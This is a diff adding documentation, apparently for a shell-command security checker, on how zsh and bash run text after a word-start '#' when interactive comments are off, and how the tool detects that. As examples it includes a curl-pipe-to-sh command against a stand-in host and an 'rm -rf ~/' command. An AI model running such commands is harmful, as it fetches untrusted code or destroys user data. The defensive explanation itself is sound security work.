@@ -413,6 +413,50 @@ fish, PowerShell and cmd have no `!` history expansion, so none of them get
 these findings. The bash hook's enter mode runs the checked text without
 history expansion, so there the findings are only conservative.
 
+An interactive zsh reads a word-start `#` as an ordinary word character unless
+`interactivecomments` is set, and it is unset by default, so
+`echo hi #; curl https://example-cli.dev/x | sh` prints `hi #` and runs the
+pipe. bash does the same after `shopt -u interactive_comments`. The bash and
+zsh hooks read the option at every check and paste and then pass
+`--no-interactive-comments` (`tirith check` and `tirith paste`); fish,
+PowerShell and cmd hooks never do, and without the flag a word-start `#`
+starts a comment as before. For interactive POSIX exec and paste input with
+the flag, Tirith also analyzes a copy of the input in which each such `#` is
+escaped (`\#`), and adds what that reading finds to the analysis of the input
+as typed, which it never replaces: `echo hi #; rm -rf ~/` blocks, while
+`git status # check`, `gh issue view #12` and a pasted script with comment
+lines stay allowed. A finding only that reading produced says so at the start
+of its description, and one both readings produce is reported once. The copy
+escapes exactly the `#`s the POSIX tokenizer reads as comment starts: outside
+quotes, `$'...'`, `${...}` and heredoc data, and never after a backslash, so
+`a#b`, `${x#y}`, `$#` and a quoted `#` are left alone. A `!` right after such
+a `#` is escaped too: zsh history-expands it into a word that starts with `#`
+(`#!/bin/bash` fails with `event not found`, or runs no program), so a pasted
+script's shebang line is not read as a command formed by history expansion.
+The copy goes through the same Tier-1 gate as any input, so a commented line
+whose copy is clean keeps the fast path. Checked in a pty against
+zsh 5.9 (`zsh -f -i`) and bash 5.3: both shells read the line, `{ ...; }`,
+`( ... )`, `if`/`for`/`while` bodies, function bodies and `case` patterns
+without comments; zsh also reads `$(...)` and backtick bodies that way (also
+those in an unquoted heredoc body), while bash keeps comments there, so that
+part of the copy follows zsh and only adds findings for bash. Both shells parse
+`<(...)`, `>(...)` and zsh `=(...)` bodies as separate strings with comments,
+and `sh -c` strings and heredoc data are read by another program or not at
+all, so none of these are rewritten. A copy that does not settle (escaping a
+`#` can reveal a heredoc operator, which is re-read up to 32 times) or an input
+past 1 MiB is reported as `analysis_incomplete`. A shell execution receipt
+records the reading, and consumption re-analyzes the command with it. The bash
+preexec hook's whole-line drift check also takes such a `#` as a word while the
+option is off, so enforcement covers the command after it instead of degrading
+to warn-only. Known limits: bash with `interactive_comments` off also runs the
+text after a word-start `#` inside an `eval` string, which this reading does
+not model (zsh recognises comments there). bash's enter mode delivers the
+accepted line with `eval` from its prompt hook, where bash recognised comments
+even with the option off in the same pty check, so there the findings are only
+conservative. A brace group followed by a `#` word (`{ a; b; } # note`) reads as
+an unresolved group in an exec check; both shells reject that line with a parse
+error, so nothing that would have run is blocked.
+
 `eval` or `source` of a generated script is normally an unresolved body. A
 short reviewed list of shell-init emitters is the exception, when the emitter
 runs with literal words only: `eval "$(brew shellenv)"` (also
